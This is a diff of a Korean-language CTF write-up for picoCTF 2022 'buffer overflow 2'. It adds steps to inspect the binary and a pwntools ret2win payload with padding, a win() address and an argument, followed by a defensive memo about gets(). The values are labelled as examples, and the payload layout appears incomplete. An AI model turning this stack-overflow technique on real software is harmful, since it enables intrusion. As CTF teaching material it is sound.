@@ -1,7 +1,7 @@
 ---
 title: buffer overflow 2 — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, ret2win, function-arguments, x86, stack-overflow, picoctf]
 sources: [https://ctftime.org/writeup/32814, https://qiita.com/housu_jp/items/5e05dcb71901a3ca2604, https://musyokaian.medium.com/buffer-overflow-2-picoctf-2022-590cf7b7961f]
@@ -76,6 +76,26 @@ io.sendlineafter(b':', payload)  # 입력을 보냅니다.
 io.interactive()                 # flag 출력 후 확인합니다.
 ```
 
+
+## 재현 절차
+
+1. 오프셋과 `win()` 주소를 확인합니다.
+```bash
+# 심볼과 보호기법을 먼저 확인합니다.
+file ./vuln              # 예상: ELF 32-bit LSB executable
+checksec --file=./vuln    # 예상: NX / Canary / PIE 상태가 출력됩니다.
+objdump -t ./vuln | grep win  # 예상: win 함수 주소가 출력됩니다.
+```
+2. 함수 인자를 포함한 ret2win 페이로드를 만듭니다.
+```python
+# saved return address 뒤에 인자도 함께 넣는 예시입니다.
+from pwn import *
+payload = b"A" * 44              # 예상: 저장된 반환 주소까지 도달합니다.
+payload += p32(0x080491f6)        # 예시: win() 주소입니다.
+payload += p32(0xdeadbeef)        # 예시: win() 인자입니다.
+print(payload)
+```
+3. 페이로드를 넣어 flag 출력 여부를 확인합니다.
 ## 6. 방어 관점 메모
 
 - `gets()`는 즉시 제거해야 합니다.
